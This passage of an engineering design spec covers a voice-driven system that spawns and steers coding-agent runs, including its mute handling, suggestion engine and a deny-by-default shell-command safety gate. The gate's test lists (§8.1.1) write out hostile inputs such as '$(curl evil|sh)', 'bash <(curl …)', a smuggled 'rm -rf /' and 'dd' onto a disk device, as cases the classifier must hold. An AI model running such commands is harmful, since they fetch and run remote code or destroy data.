  is stopped ≤500 ms (Pipecat `stt_mute_filter` pattern, eng-oss §1.3); E2 → persistent mute tone; the
  mute is **announced with a one-word TTS** ("Muted") alongside the earcon (REQ-2 **AC2.4**, R13 — this
  is an *output*, so it is allowed even though the pipeline has stopped); **zero observations** are fed
  into the suggestion/routing pipeline or persisted while muted. **Cue (the voice library) keeps
  listening for the "unmute" keyword** even while the pipeline is paused — we build no bespoke
  on-device spotter for this (§5.3.1).

### 5.3.1 Unmuting: say "unmute" or press the on-screen unmute button (V0 update — supersedes R10)

Per the V0 decision update there are **two ways to unmute**, and we build **no bespoke on-device
keyword spotter**:

- **(a) Say "unmute".** The voice library (Cue, by Etheria) already handles always-on keyword listening
  even while cloud transcription / suggestions are paused, so it hears "unmute" while muted and resumes
  feeding the pipeline. *(V0 scope cut: the prior bespoke local "Daybreak" spotter, the blocking
  P-SPOTTER probe, and the "spotter-unavailable" degradation logic are all **removed** — we trust the
  library.)*
- **(b) Press the on-screen "unmute" button.** The screen always offers an unmute button, so the room
  is never trapped even if the keyword is mis-heard.

Because Cue handles keyword listening while muted, **the illegal "emergency-stop-unmutes" path is moot
and the spotter-down teardown/clean-restart recovery is removed** — there is no spotter to go down.
REQ-14's emergency control remains exactly a **kill-all** (AC14.2 preserved, §11) and is never an
unmute. *(This supersedes the prior `unmute-recovery.html` / ENG-A-13 story.)*

### 5.4 The "working-on-it" timeout ack (R5) — REQ-10 AC10.3

A `RoundTripTimer` is armed in the decision plane the instant a recognized command is dispatched and
its `correlationId` enters the loop. If the command's substantive acknowledgement (TTS or completing
earcon) has not been emitted within the round-trip budget (configurable; default = the p95 target of
1.5 s, AC10.2), the hot plane emits a distinct **"working" ack** — a Layer-B **non-tonal soft repeated
pulse** (categorically distinct from the 5 tonal earcons per D-DD-23, so the "exactly 5 tonal earcons"
decision is preserved) — rather than going silent. The pulse repeats at a low cadence until the
substantive ack arrives or the action resolves/aborts. This is added as a first-class row in the
output-policy triage (§5.5) and to `OutputDecision.channel:'ack'` (§1.3).

**Verify (audio output, incl. timeout ack):**
- *Unit/integration:* *earcon-latency test* (mocked clock — E1 ≤300 ms; RBG: 100 ms budget → fails,
  relax → passes); *Layer-A/B-disjoint test* (RBG: give a routing/latency ack a pitched tone → overlap
  detector fails); *class→channel map test* (RBG: route routine tick → tts → fails); *15-word-guard
  test* (16 words → summarized; RBG: remove guard → recited verbatim → fails); *never-recite test*;
  *silence-budget test* (>10% TTS-ticks in window → gate tightens); ***mute-announce test*** — "mute"
  emits the mute earcon **and a one-word TTS "Muted"** (REQ-2 AC2.4; RBG: drop the one-word TTS →
  earcon-only → fails); ***halt-announce test*** — a stop/panic halt emits **E5 + a ≤15-word TTS**
  acknowledgement naming the target (REQ-12 AC12.3; RBG: map halt to earcon-only → fails);
  *mute-latency test* ("mute" stops the pipeline ≤500 ms);
  *no-observation-while-muted test* (RBG: leave the pipeline fed on mute → observations appear → fails);
  *ambient-silence test* — an ambient `observe.pass` produces **no sound** (RBG: emit any ack for
  ignored ambient speech → fails); ***unmute-keyword test*** — Cue's keyword listening hears "unmute"
  while muted and resumes the pipeline; ***unmute-button test*** — the on-screen unmute button resumes
  the pipeline; ***timeout-ack test*** — with the substantive ack mocked to exceed the budget, the
  "working" pulse fires once budget is blown and stops when the ack arrives (RBG: remove the
  `RoundTripTimer` → silence on overrun → fails; restore → pulse fires).
- *E2e:* representative session — TTS-bearing-tick ratio ≤10% (RBG: chatty build → exceeds → fails);
  every state transition emits its mapped earcon; ambient `observe.pass` = **silent** (positive
  assertion: no sound), addressed pass = declined tick (§4.2); speak "mute" → the pipeline
  stops ≤500 ms (measured), E2 → mute tone **and a spoken "Muted"** (AC2.4), subsequent speech feeds
  zero observations into the pipeline; speak "unmute" (or press the unmute button) → resumes; a
  stop/panic produces **E5 + a ≤15-word spoken acknowledgement** (AC12.3); post-run disk/log scan finds
  **zero** audio artifacts across the muted interval (RBG: route muted-interval mic to a recorder →
  scan finds a blob → fails); ***timeout-ack e2e*** — inject a build whose round-trip exceeds 1.5 s and
  assert the "working" pulse is heard (RBG: speed the build under budget → no pulse).
- *Third-party:* P-TTS (streaming start latency), P-LLM (summarizer ≤2 s), P-ASR (stream stop/restart).
- *Observability:* `earcon.emit{id, latencyMs, source}`, `ack.working{correlationId, elapsedMs}`,
  `output.decision{tickId, class, channel, wordCount, summarized}`, `mute.engaged{latencyMs}`,
  `mute.released{trigger, latencyMs}`, `mute.heartbeat{feedingPipeline:false}` (periodic proof the
  pipeline stayed unfed while muted).

### 5.5 Output triage (default = silent)

| Trigger | Channel | Max |
|---|---|---|
| Completion / blocker / explicit "status" | TTS | **≤15 words** (REQ-9 AC9.3, R13) |
| **Halt (stop/panic)** | **Earcon E5 + TTS** | **≤15 words** (REQ-12 AC12.3, R13) |
| **Mute ("mute")** | **Earcon/mute-tone + TTS** | **1 word** ("Muted" — REQ-2 AC2.4, R13) |
| State transition (wake/spawn/resolve) | Earcon (Layer A, ≤500 ms) | — |
| Route ack (suggestion whoosh / steer tick-tick / addressed-pass declined tick) | Ack (Layer B, non-tonal) | — |
| **Ignored ambient speech (`observe.pass` / `route.pass` ambient)** | **Silent (no sound)** | — |
| **Round-trip budget exceeded** | **"working" ack (Layer B pulse)** | — |
| Routine progress / tick | Silent | — |

---

## 6. Suggestion engine — REQ-3

`src/suggest/engine.ts`. Gated behind the REQ-3 floor (≥60 words **OR** ≥90 s substantive talk) **and**
quality **and** **room-interrupt cost** (design §4.1):

```
fire = gate_passed AND quality >= quality_threshold AND (interrupt_cost low OR room idle ≥10 s)
```

Otherwise **queued** and delivered on the next `IdleCue` gap; a queued suggestion **expires after 90 s**
with no idle gap (logged `suggestion.expired`, never spoken; D-DD-15). Delivery format: ≤12-word
spoken concept pitch + 1–3 MCQs answerable aloud (never >3); apologetic language banned (design §4.2).
Cadence/TTL, the word/time gate, the quality threshold, and the interrupt-cost gate are all **ENV-tunable
parameters with documented defaults (§14)**, patchable without restart (AC3.5) and **tuned by feel
later** — not a fixed metric. On delivery, the engine **hands a `PendingSuggestion` to the acceptance
owner (§7)** — the suggestion's pitch + its MCQs become the seed scaffold the acceptance flow
accumulates answers into.

**Verify (suggestion engine):**
- *Unit/integration:* *gate-boundary tests* (against the configured default thresholds: 59→pass,
  61→eligible; 89 s→pass, 91 s→eligible; RBG: lower threshold → 59-word case fires → fails);
  *MCQ-count invariant* (RBG: force 4 → fails); *interrupt-cost test* (high velocity / utterance <5 s
  old → queued, not spoken; RBG: zero out cost → fires mid-speech → fails); *expiry test*; *env-knob
  test* (cadence/TTL/threshold patch at runtime, AC3.5); *handoff test* — a delivered suggestion
  produces exactly one `PendingSuggestion` with the pitch + MCQs populated (§7).
- *E2e:* a record-replay sanity scenario (temp-0) drives a representative recorded session and asserts
  the engine stays mostly silent and that obvious "should suggest" moments fire and obvious chatter
  passes, **against the configured defaults**. *(V0 scope cut: no formal labeled replay corpus and no
  hard restraint metric — recall ≥80% / ≤1 FP per 10 min etc. are dropped as hard requirements;
  restraint is the ENV-tunable params above, tuned by feel later. See §15.5 / E9.)*
- *Third-party:* P-CUE (`WordCountCue`, `IdleCue`, `IntervalCue`, `cooldownSeconds`, `observe.pass`),
  P-LLM (cheap/fast scoring, temp-0 determinism).
- *Observability:* every decision — **fire and every `observe.pass`** — logs `{policy, wordCount,
  elapsedS, quality, interruptCost, decision, decisionId, correlationId}`.

---

## 7. Acceptance → spawn flow (R3) — REQ-4

`src/acceptance/`. The central hands-free spawn path, previously under-specified. It is its own state
owner so the accept/decline/ignore semantics and the seed contents are deterministic and testable.

- `pending.ts` — **the pending-suggestion state owner.** Holds at most one `PendingSuggestion` at a
  time, entered when the suggestion engine delivers (state `SUGGESTION_DELIVERY`). It **accumulates
  MCQ answers** spoken aloud while the window is open (each answer appended to `answers[]`,
  correlated by MCQ index), and tracks expiry (the design's 5 s no-answer re-queue / second-non-answer
  discard, design §4.2).
- `classifier.ts` — the **accept/decline classifier**, *state-gated* (live **only** in
  `SUGGESTION_DELIVERY`): "Yes/Accept/Do it" → accept; "No/Nah/Skip" → decline; anything else while
  pending → treated as an MCQ answer if a question is open, else ignored. Outside
  `SUGGESTION_DELIVERY` these words are inert (the tier-gating invariant, §4).
- `spawn.ts` — on **accept**: builds the **seed** = `{pitch, mcqs, answers}`, calls the **pre-spawn
  resource check (§10.1)**, then `{type:'spawn', payload:seed}` across the seam (§9). On a successful
  spawn it **auto-selects** the new process (opens its steering window) and **transitions it to
  PLANNING** (AC4.1), and a spoken confirmation names the callsign within 3 s (AC4.2/AC4.3, E3 + ≤15-
  word TTS). On **decline or ignore-timeout**: **no-op** — no spawn, the process registry is unchanged
  (AC4.4), `PendingSuggestion` is cleared.

**Verify (acceptance → spawn):**
- *Unit/integration:* *exactly-one-spawn test* — accept adds exactly one process to the registry;
  decline/ignore add zero (RBG: make decline fall through to spawn → registry grows → fails);
  *seed-contents test* — the spawned seed contains the pitch **and** every accumulated MCQ answer
  (RBG: drop `answers` from the seed → fails); *auto-select test* — post-spawn the new process is the
  selected one; *planning-transition test* — the new process is in PLANNING immediately after spawn;
  *classifier tier-gating test* — "Yes" outside `SUGGESTION_DELIVERY` does nothing (RBG: make accept
  always-hot → casual "yes" spawns → fails); *MCQ-accumulation test* — answers spoken across multiple
  utterances all attach in order; *ignore-timeout test* — no answer/accept within the window → no-op,
  registry unchanged.
- *E2e:* live — a suggestion fires → speak MCQ answers → speak "accept" → assert exactly one real
  durable process exists, is selected, is in PLANNING, seeded with pitch + answers, and a spoken
  confirmation naming its callsign is heard within 3 s; a separate run where the room speaks "skip"
  (or stays silent) → assert **no** process and **no** registry change (RBG: a build that spawns on
  decline → the no-op assertion goes red).
- *Third-party:* P-SMITHERS (durable spawn with seed payload), P-SEAM (spawn round-trips ≤3 s without
  blocking the Cue loop).
- *Observability:* `suggestion.pending{suggestionId, correlationId}`, `mcq.answer{suggestionId, index}`,
  `acceptance.decision{decision: accept|decline|ignore, suggestionId}`,
  `process.spawn{upid, runId, seedHash, suggestionId, correlationId}` (full causal chain).

---

## 8. Safety & execution posture — the execution-boundary hook (R1) — REQ-11

`src/safety/`. **The R1 fix.** REQ-11 requires read-back + spoken "confirm" **before a destructive/
irreversible action executes**. Destructive work happens **inside a Smithers run** when the agent
calls a tool — the dispatcher never sees it. So the gate must live at the agent's tool-call boundary,
not in the dispatcher. (`safety-execution-boundary.html`, ENG-A-08.)

### 8.1 Where the gate lives: an in-run PreToolUse hook + safe-executor

Every Panopticon process is a Smithers durable run that registers a **PreToolUse hook** (Smithers
exposes pre/post-tool hooks — the same mechanism the platform's snapshot hook uses — and a blocking
approval-gate / signal primitive; **P-HOOK proves this against the real API before any code trusts
it**, §17). The hook is the safe-executor:

1. **Intercept the real tool call** `{tool, args}` *before execution* (e.g. `Bash("rm -rf …")`,
   `Write`/`Edit` (overwrite), `git push --force`, a DB `DROP`/`TRUNCATE`, a network mutation).
2. **Classify deny-by-default** (`classifier.ts`): tools are bucketed into `read` (pass) vs. mutating
   classes (`fs-write`, `fs-delete`, `shell`, `vcs-push`, `db-mutate`, `net-mutate`) and **`unknown`**.
   Any mutating-or-unknown class in **Safe** mode requires approval. This is strictly stronger than the
   prior static NL-verb whitelist (the R1 "misses many dangerous operations" finding): the classifier
   sees the **actual tool invocation** at the real call site, and the default for anything
   unrecognized is *gate it*, not *allow it*. **`shell` is the one class that must NOT be gated
   wholesale** — a coding agent runs harmless shell constantly (`ls`, tests, typechecks, `git`
   inspection), and gating all of it turns Safe into Explicit and violates AC11.1 (the R9 finding).
   Shell is therefore sub-classified by the **deterministic shell-command policy in §8.1.1** before it
   maps to `read` (ungated) vs. `shell`-mutating/`unknown` (gated).
3. **Hold the call.** The hook blocks the run at the tool boundary (Smithers approval-gate / blocking
   signal) — the action does **not** execute while held.
4. **Read-back to voice.** The hook emits an `approval` run-event (`ApprovalRequest{gateId, readback}`)
   across the seam → RunEventNormalizer → Cue → OutputPolicy speaks "I'm about to [verb] [object].
   Say 'confirm' to proceed." — **≤15 words** (REQ-9 AC9.3, R13; `[verb]`=1 word, `[object]`≤3 words
   keeps it ≤11 words). The 15-word guard (§5.2) is the hard enforcer; a longer object is summarized.
5. **Resolve.** "Confirm" (state-gated to a pending read-back, §4.3) → dispatcher `{type:'approve',
   payload:{gateId}}` → hook releases → tool executes **exactly once**. A **dead-man timer (25 s,
   D-DD-06)** is armed *in the hook* at read-back: on timeout (or "Abort", or an explicit "deny") the
   hook **aborts the tool call** (never executes), emits E5, logs `safety.resolution{confirmed:false,
   timedOut:true}`. Because the timer and the hold both live in the hook, a missed/mis-heard "stop"
   still results in **abort, not execution** (AC11.3).

This makes the guarantee real: Panopticon *cannot* miss a destructive action, because the gate is the
agent's own tool-call boundary, and the default is to hold.

### 8.1.1 The shell-command classifier — keeping Safe autonomous (R9, critical) — REQ-11 AC11.1

The R9 finding: a blanket `shell` gate makes **Safe mode behave like Explicit** (every `ls`/test/
typecheck/`git status` would prompt), violating **AC11.1** ("the default posture runs to completion
without per-step approval"); but selectively allowing shell with no defined policy is unsafe. We
define a **deterministic, code-only** shell classifier (`safety/shell-classifier.ts`,
`shell-classifier-policy.html`, ENG-A-12) that distinguishes read-only shell (ungated, so Safe stays
autonomous) from destructive/unknown shell (gated). It runs **before** the §8.1 class mapping and
produces a `ShellVerdict` (§1.3). **No LLM is involved** (bet #4) — same command in → same verdict
out, replayable.

**Algorithm (fully deterministic):**

1. **Parse** the command string into tokens + operators with a real shell parser (`shell-quote`'s
   `parse`, a 3rd-party lib → **P-SHELL-PARSE**, §17), splitting on `&&`, `||`, `;`, `|`, and newlines
   into **simple commands**. Parsing — not regex — is what makes compound/redirect/injection handling
   correct.
2. **Classify each simple command** by its program (`argv[0]`) + flags:
   - **`read-safe` (ungated)** — a curated allowlist of read-only programs: `ls pwd cat head tail wc
     file stat echo printf env which type date tree sort uniq cut column`, `grep/rg/ag` (no `-r`-to-
     write), `find` **only if** it carries no `-delete`/`-exec`/`-execdir`/`-fprint`, `sed`/`awk`
     **only without** in-place/write flags (`sed -i` → mutating), `diff cmp`, `git
     status|diff|log|show|branch|remote -v|rev-parse|describe|blame|ls-files|config --get|cat-file`,
     `bun test`, `tsc --noEmit`/typecheck, `node/bun --version`, `cat`-style reads. Test/typecheck/lint
     runners are explicitly read-safe so the agent's normal verify loop never prompts (AC11.1).
   - **`mutating` (gated)** — a curated destructive set: `rm rmdir unlink shred dd mkfs truncate
     chmod -R chown -R kill pkill reboot shutdown`, `mv`/`cp` over an existing target, `git push`
     (esp. `--force`), `git reset --hard`, `git clean -fd`, `git checkout -- <path>` (discards),
     `bun/npm install|publish` (runs lifecycle scripts / writes lockfile), `docker rm|rmi|system
     prune`, `kubectl delete`, `terraform apply|destroy`, and DB mutations via `psql/mysql/sqlite3 -e
     '… DROP|TRUNCATE|DELETE|UPDATE …'`.
   - **Redirections** — any `>`/`>>` to a real path = a write/overwrite → **mutating** (even if the
     program is otherwise read-safe: `echo x > config.yml` is gated). `>/dev/null`, `2>&1` are inert
     and ignored.
   - **Injection / opacity** — any command substitution `$(…)` / backticks, `eval`, `exec`,
     `source`/`.`, process substitution `<(…)`/`>(…)`, a here-doc piped to a shell, or **any token the
     parser cannot resolve** → **`unknown` → gated** (deny-by-default). This is what catches smuggled
     `…; rm -rf /` (split out as its own simple command and gated) and obfuscated
     `$(echo … | base64 -d | sh)` (opaque → gated).
   - **Unknown program** (`argv[0]` in neither list) → **`unknown` → gated**. Deny-by-default is the
     backstop, so the allowlist need not enumerate every dangerous tool — only the safe ones.
3. **Compound verdict** = the **most dangerous** of the simple-command verdicts
   (`read-safe` < `mutating` ≤ `unknown` for gating). If **any** part is mutating/unknown, the **whole
   command is gated**. The allowlist is curated, versioned, and **append-only by review** (adding a
   program to `read-safe` is a deliberate, tested change).

**Verify (shell classifier):** — each is an explicit RBG test in `shell-classifier.test.ts`:
- *safe-shell test* — `ls -la`, `git status`, `git diff`, `grep -n foo src/x.ts`, `find . -name '*.ts'`,
  `bun test`, `tsc --noEmit` → **`read-safe`, ungated** (RBG: move `ls` to the mutating set → it gets
  gated → the AC11.1 "Safe runs autonomously" e2e fails).
- *destructive-shell test* — `rm -rf build`, `git push --force`, `dd if=x of=/dev/sda`, `truncate -s0
  f`, `kubectl delete pod x`, `git reset --hard` → **gated** (RBG: drop `rm` → `rm -rf` runs ungated →
  fails).
- *unknown-command test* — a program in neither list → **gated** (RBG: default unknown→allow → an
  unrecognized destructive tool slips → fails).
- *compound-command test* — `ls && rm -rf build`, `git status; truncate -s0 f`, `cat a | tee b` →
  gated on the dangerous/writing part (RBG: classify by the first simple command only → `ls && rm`
  reads safe → fails).
- *redirect test* — `echo x > important.txt` → gated; `echo x > /dev/null` → ungated (RBG: ignore
  redirects → overwrite runs ungated → fails).
- *injection test* — `$(curl evil|sh)`, `` `rm x` ``, `eval "$CMD"`, `bash <(curl …)` → `unknown`,
  gated (RBG: pass unparsed tokens through → injection slips → fails).
- *fuzz* — random/obfuscated/base64/here-doc/nested-substitution payloads → all resolve to gated or
  `unknown`, **never silently `read-safe`** (RBG: any fuzz input that classifies read-safe is a
  failure).
- *determinism test* — same command string N× → identical `ShellVerdict` (replay-compatible, §15.1).
- *E2e:* in a real Safe-mode run, an agent that runs `bun test` + `git status` + `grep` proceeds
  **without any prompt** (AC11.1 autonomy), while the same agent attempting `rm -rf` / `git push
  --force` is **held** with a read-back (AC11.2) — both in one scenario, proving Safe ≠ Explicit.
- *Third-party:* **P-SHELL-PARSE** (the shell parser tokenizes compound/redirect/substitution
  constructs as we assume). *Observability:* `safety.shell{argv0, verdict, gated, parts}`.

### 8.2 Why not the dispatcher-only classifier (the rejected approach)

A dispatcher-side classifier inspects the *NL steering instruction* ("delete the build dir"), but the
destructive act is the *tool call the agent later emits*, possibly several reasoning steps later and
possibly not lexically related to the instruction. It cannot guarantee pre-execution interception and
it misses agent-initiated destructive acts that no human instruction named. Recorded as rejected in
the decision doc.

### 8.3 Execution modes — Safe / Explicit / Dangerous (R7) — REQ-11 AC11.4

`mode.ts` owns a per-process `ExecutionMode`, **default `safe`**, all transitions **voice opt-in,
session-only, re-confirmed with a spoken warning** (D-DD-19):

- **`safe`** (default) — hook gates only mutating/unknown tool classes (§8.1).
- **`explicit`** (fully-explicit, opt-in) — hook gates **every** action (per-step approval); the most
  conservative posture, for high-stakes work.
- **`dangerous`** (opt-in) — hook **bypasses** the gate entirely; armed only after a spoken warning
  read-back and an affirmative confirm, and reset to `safe` at session end.

Both non-default modes are **off by default** and reachable only by the state-gated mode commands
(§4.3), each requiring a spoken warning + confirm before taking effect.

**Verify (safety + modes):**
- *Unit/integration:* *hook-intercept test* — a mutating tool call in Safe mode is **held** (does not
  execute) and emits an `ApprovalRequest` (RBG: bypass the hook → the file is modified before approval
  → fails); *deny-by-default test* — an `unknown`-class tool is gated, not allowed (RBG: default
  unknown→allow → an unclassified destructive tool slips → fails); *posture state-machine test* —
  no "confirm" in 25 s → **abort**, tool not executed (mocked clock, Temporal `env.sleep()` analog,
  eng-oss §3.6); *error-path/fuzz* (garbled confirm token, "confirm" to the wrong process/gateId,
  double-confirm → resolve safely, **never double-execute**); *mode-default test* — a fresh process is
  `safe` (RBG: default to `dangerous` → fails); *explicit-mode test* — **every** action is gated,
  including `read-safe` shell that Safe mode lets through (the crisp Safe≠Explicit boundary, R9);
  *safe-mode-autonomy test* — in Safe mode a sequence of `read-safe` shell (`bun test`, `git status`,
  `grep`) runs with **zero** approvals (AC11.1; RBG: gate all shell → an approval appears → fails);
  *dangerous-mode test* — gate bypassed **only** after the spoken warning + confirm, and **resets to
  safe** at session end (RBG: persist dangerous across sessions → fails); *mode-command test* — each
  mode command flips the mode and requires a spoken warning + confirm.
- *E2e:* live — instruct a process toward a destructive act → it reads back and **blocks** (the file
  is verifiably unmodified while held); withholding "confirm" aborts after the timer with the file
  still unmodified; speaking "confirm" proceeds **exactly once**; switch to explicit mode → a
  non-destructive action is also gated; switch to dangerous mode (with warning) → a destructive act
  proceeds without a gate.
- *Third-party:* **P-HOOK** (the PreToolUse hook can intercept + hold a real tool call before
  execution and resolve approve/deny/timeout) + **P-SMITHERS** (pause/steer/cancel mid-run).
- *Observability:* `safety.intercept{upid, tool, klass, gateId}`, `safety.readback{action, gateId}`,
  `safety.resolution{action, gateId, confirmed|aborted|timedout, timerMs}`, `mode.set{upid, mode,
  warned:true}`.

---

## 9. The Cue↔Smithers seam — REQ-4, REQ-8, REQ-11, REQ-13, REQ-15 (bet #3)

`src/seam/`. **The novel integration, isolated into one module.** Bidirectional and asynchronous so
spawn never blocks the Cue loop (AC4.3 requires ≤3 s; eng-deps §9).

- `dispatcher.ts` — Hono HTTP/WebSocket endpoint that receives every `DispatchedAction` from Cue
  routing and calls the Smithers client. **Async dispatch** — returns immediately, the spawn completes
  off the hot path. Handles the full action set incl. `status` (queries the registry → ≤15-word
  summary), `pauseAll`, `setMode`, and the **`approve`/`deny`** safety resolutions (§8).
- `smithers-client.ts` — wraps Smithers durable-run APIs: `spawn(seed)`, `steer/signal(upid,payload)`,
  `pause/resume(upid)`, `halt(upid)`, `streamRunEvents(upid)` (SSE), and the **approval-gate resolve**
  `approve(upid,gateId)`/`deny(upid,gateId)`. Isomorphic to Temporal's `signal`/`startChild`
  (eng-oss §3.3/§3.4): `{type:"steer",upid,payload}` → `client.signal(upid,"steer",payload)`. **All
  model calls route through Smithers subscriptions — never a raw API key** (PRD §6, ENG-D-02). Fork may
  require a fresh seeded run + `parentId` lineage rather than a native fork — P-SMITHERS determines
  which (eng-oss §3.4).
- `run-events.ts` — normalizes Smithers SSE run-events → `RunEvent` (incl. the `approval` kind from the
  §8 hook), summarizes to ≤15 words *before* TTS, and feeds them back into Cue as observations
  (`cue.send_observation`) for voice-out coherence. Handles SSE reconnect without stalling voice-out;
  maintains UPID↔steering-window correlation across Cue session restarts.

**Verify (seam):**
- *Unit/integration:* *action-schema-match test* (the dispatched action matches the real
  `MappedActionTool` shape across the **full** action set incl. status/setMode/approve/deny; RBG:
  change a field name → fails); *async-dispatch test* (spawn returns without blocking the decision
  plane; mocked slow Smithers still lets the next observation process); *SSE-reconnect test* (drop +
  restore the stream → voice-out resumes, no duplicate observations); *UPID↔window-correlation test*
  (survives a simulated Cue restart); *approval-roundtrip test* — an `approval` run-event surfaces a
  read-back and an `approve` resolves the right `gateId` (RBG: resolve the wrong gateId → the held
  action stays held → fails).
- *E2e:* the full spine (§10) drives a **real durable run** spawn→confirm within 3 s;
  *durability-recovery test* — kill the backend mid-run, restart, assert resume from last checkpoint
  (work not lost, REQ-15); *fleet-isolation test* — steer A, assert B byte-identical (REQ-8/13);
  *safety-roundtrip e2e* — a destructive tool call inside a real run round-trips read-back→confirm via
  the seam and executes exactly once (ties §8 to the real API).
- *Third-party:* **P-SMITHERS** + **P-SEAM** + **P-HOOK** (the seam carries the safety round-trip).
- *Observability:* `process.spawn{...}`, `process.steer{targetUPID, instructionId,
  accepted|reprompted|dropped}`, action-dispatch + run-event traces keyed by `correlationId`/`upid`.

---

## 10. Process registry, lifecycle, fleet & the spine — REQ-4, REQ-5, REQ-8, REQ-12, REQ-13, REQ-15

`src/process/`.

- `registry.ts` — the UPID registry: callsign↔UPID mapping, fleet state (V0 max 2 concurrent, NG-3),
  callsign assignment + 60 s cooldown. An **unselected process keeps running** ("unselected" ≠
  "paused", AC13.3). Owns the **`status`** summary (active callsigns + states, ≤15 words).
- `lifecycle.ts` — the per-process state machine `planning → active ⇄ paused → dead` with assertions
  at each edge; **pre-kill context archive** (AC15.2); **restart recovery** to last durable checkpoint
  (AC15.3). Backed by Smithers durability (§9). **Per-process pause/resume (R11)** drive the
  `active ⇄ paused` edge for a **single UPID**: a `{type:'pause', targetUPID}` from the §4.3 callsign
  command pauses **only** that process (`client.pause(upid)`), leaving every sibling running (AC13.1);
  `{type:'resume', targetUPID}` reverses it. This is the deterministic command path behind the REQ-13
  "steer A, **pause B**" e2e — there is no free-form NL pause (REQ-7/NG-2). `pauseAll` (§4.3) iterates
  the registry calling the same per-UPID pause.

### 10.1 Pre-spawn resource check (R8) — REQ-15 AC15.2

`resource-check.ts`. Before any spawn (called by §7 acceptance), the registry runs a **pre-spawn
resource check** — the second half of AC15.2 alongside the pre-kill archive:

- **Capacity gate:** refuse if the fleet is already at the V0 concurrent cap (NG-3 = 2).
- **Host headroom gate:** refuse if available Smithers run slots / memory headroom are below a
  configurable floor (a real check against the durable plane, not a guess).
- **Failure behavior:** on insufficient resources the spawn is **refused** — the registry is
  **unchanged**, an **audible refusal ack** is spoken (≤15-word TTS, e.g. "At capacity — stop a
  process first." + earcon), and `spawn.refused{reason, correlationId}` is logged. The refusal is
  surfaced to the acceptance flow (§7) so it does **not** silently appear to have spawned.

**The spine (REQ-5)** is the integration of §3–§10 under one `correlationId` minted at wake-detection
that threads `wake → decision → action → spoken ack`. A single trace query reconstructs the full loop.

**Verify (registry/lifecycle/resource-check/fleet/spine):**
- *Unit/integration:* *concurrent-registry test* (two live processes, independent state); *lifecycle-edge
  tests* (each transition asserted); *pre-kill-archive test*; *recovery-equality test* (reloaded state
  == pre-restart snapshot); ***pre-spawn-resource-check test*** — at the concurrent cap, a spawn is
  refused, the registry is unchanged, and the refusal ack is emitted (RBG: remove the check → a 3rd
  process spawns → fails; restore → refused); *host-headroom test* — below the headroom floor → refused
  with `spawn.refused{reason:'headroom'}`; *degradation test* — disable the fleet path and assert
  REQ-5's scenario test **still passes** (fleet is additive, never a dependency of the spine, AC13.4);
  *stage-sequencer test* drives the four spine stages through happy path **and** each single-stage
  failure (mis-heard wake, empty intent, action error, TTS failure; RBG: drop the ack on the
  action-error branch → fails).
- *E2e:* the **canonical scenario test** — scripted audio drives wake→intent→action→confirm against
  the live stack; run **≥10×**, assert **≥9 pass** (AC5.2); a **no-screen harness** asserts **zero**
  GUI/keyboard events consumed (AC5.1; RBG: feed a build with a broken dispatcher → ≥2 runs fail →
  suite goes red). Fleet: spawn two (Atlas, Bravo); "Atlas, make it faster" steers A, then **"Bravo,
  pause"** pauses B **via the §4.3 per-process pause command** (R11) — confirm A advanced and B paused
  independently and that **no free-form NL** was needed (RBG: route "pause the second one" with no
  callsign → rejected at dispatch); leave both unselected and confirm both progressed. *Resource-check
  e2e* — fill capacity, attempt a third spawn by voice, assert the spoken refusal and that no third
  process appears.
- *Third-party:* all probes (P-CUE, P-ASR, P-TTS, P-LLM, P-SMITHERS, P-SEAM, P-HOOK).
- *Observability:* one `correlationId` across the loop; `fleet.snapshot{upids[], states[],
  lastAction[]}`; `spawn.refused{reason, correlationId}`; durable checkpoint log `{runId, seq,
  stateDigest}`.

---

## 11. Emergency stop (non-voice, emergency-only) — REQ-14

`src/emergency/stop.ts`. A single non-voice control (Hono endpoint bound to a physical key / one
control) that halts **all** processes and stops listening within 2 s, **ending the session**.
**Scoped to kill-all only** — it exposes **no** steer/select/spawn **and no unmute/resume** (preserving
D1: voice is the sole *operational* modality; AC14.2). Loud, unambiguous signal.

**It is NOT an unmute (R10).** The prior draft reused this control to recover from a stuck mute; that
violates AC14.2 (kill-all only). The correct recovery from a stuck mute when the local spotter is
unavailable is: this control **kills all + stops listening (session ends)**, and the room **restarts a
fresh session**, which begins **unmuted** with the §12 consent re-spoken. That is a session
teardown + clean restart, never an in-session unmute (see §5.3.1; `unmute-recovery.html`, ENG-A-13).

**Verify (emergency stop):**
- *Unit/integration:* *handler test* (halts every registered process + the listener); *scope test*
  (exposes **only** kill-all; RBG: add a steer route → fails); ***no-unmute-verb test*** — the control
  exposes no resume/unmute path (RBG: add an unmute route → the AC14.2 scope test fails).
- *E2e:* with several processes running, trigger the control → all halt + listening stops ≤2 s (session
  ends), with an unambiguous signal; a subsequent fresh session starts **unmuted** with consent
  re-spoken (the only spotter-down recovery, §5.3.1).
- *Observability:* `emergency.stop{trigger: non-voice, processesHalted, latencyMs, sessionEnded:true}`.

---

## 12. Onboarding, consent & raw-audio persistence guard (R2) — REQ-1

`src/onboarding/`. The R2 fix — REQ-1's consent (AC1.1), listening indicator (AC1.2), and
transcript-only persistence (AC1.3) were previously unowned.

- `consent.ts` — **the consent scheduler.** Fires the spoken consent announcement **once per session,
  idempotent, within 3 s of start** (AC1.1). The line **must state that only transcripts are saved**
  (AC1.1 literal requirement, R12): **"Panopticon is listening. Only transcripts are saved. Say 'Panop,
  status' for a rundown; say 'Curtain' to pause."** — three sentences, ≤8 s (design D-DD-16), naming
  the **actual** mute word "Curtain" **and** the transcript-only privacy statement. Emits
  `session.start{provider, consentSpoken:true, transcriptOnlyStated:true}`. *(Design §10's onboarding
  quote omitted the transcript-only sentence; PRD AC1.1 is binding, so the eng text above is
  authoritative and a one-line design erratum is surfaced to the gate.)*
- `listening-indicator.ts` — **the listening-indicator owner** (AC1.2). The **authoritative** indicator
  is the audible E2 transcribing-ambient earcon while the mic streams; the optional visual badge on
  the read-only board is non-authoritative (D1). The indicator is driven by the mic-stream state, not
  by the board.
- `persistence-guard.ts` — **the whole-session raw-audio guard** (AC1.3 / NG-6). This is engineered as
  an **invariant in code**, not just a post-run scan: the audio buffer is **never handed to any
  writer** — a single chokepoint asserts that no raw-audio path reaches disk/logs for the **entire
  session** (not just the muted interval, the R2 narrowness finding). Backed by a mock-writer test
  (assert never-called) and a whole-session disk/log scan.

**Verify (onboarding/consent/persistence):**
- *Unit/integration:* *consent-scheduler test* — fires once per session, idempotent, within 3 s of
  start (RBG: make it fire twice → idempotency fails); *consent-content test* — the first announcement
  **contains the transcript-only statement "Only transcripts are saved"** (AC1.1, R12) **and** names the
  actual mute word "Curtain" (RBG: drop the transcript-only sentence → the AC1.1 content assertion
